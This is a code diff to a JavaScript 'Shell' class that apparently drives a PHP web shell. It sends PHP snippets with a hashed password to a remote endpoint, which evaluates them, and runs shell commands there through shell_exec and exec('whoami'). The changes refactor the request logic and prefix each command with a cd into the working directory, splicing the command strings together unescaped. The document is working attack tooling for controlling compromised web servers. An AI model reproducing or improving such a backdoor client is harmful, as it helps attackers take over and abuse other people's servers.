@@ -40,12 +40,12 @@ class Shell{
 		this.entrypoint = host;
 		this.token = token = crypto.createHash('sha1').update(token).digest('hex');;
 
-		let data = await this.php(`return [
-				'sucess' => true,
+		let data = await this.php(`return array(
+				'sucess' => true, 
 				'pwd' => $_SERVER['DOCUMENT_ROOT'],
-				'whoami' => get_current_user(),
+				'whoami' => exec('whoami'),
 				'hostname' => gethostname()
-		];`);
+		);`);
 
         this.user = data.whoami;
         this.hostname = data.hostname;
@@ -102,18 +102,23 @@ class Shell{
 		}
 	}
 
+	async call(c){
+        const res = await axios.post(this.entrypoint, qs.stringify({
+            'c' : c,
+            'p' : this.token
+        }));
+        return res.data;
+	}
+
 	async php(request){
-		const res = await axios.post(this.entrypoint, qs.stringify({
-			'c' : `ob_clean();
+		const response = await this.call(`ob_clean();
 			header('Content-Type: application/json');
 			function crazyexec(){`+request+`}
-			echo json_encode([
+			echo json_encode(array(
 				'result' => crazyexec(),
-			]);
-			exit;`,
-			'p' : this.token
-		}));
-		return res.data.result;
+			));
+			exit;`);
+		return response.result;
 	}
 
 	async stream(request){
@@ -148,7 +153,7 @@ class Shell{
 			        flush();
 			    }
 			}`);*/
-		return await this.php(`return shell_exec("${cmd} ${args} ${after}");`);
+		return await this.php(`return shell_exec("cd `+this.pwd+` && `+cmd+` `+args+` `+after+`");`);
 	}
 
 	quit(){
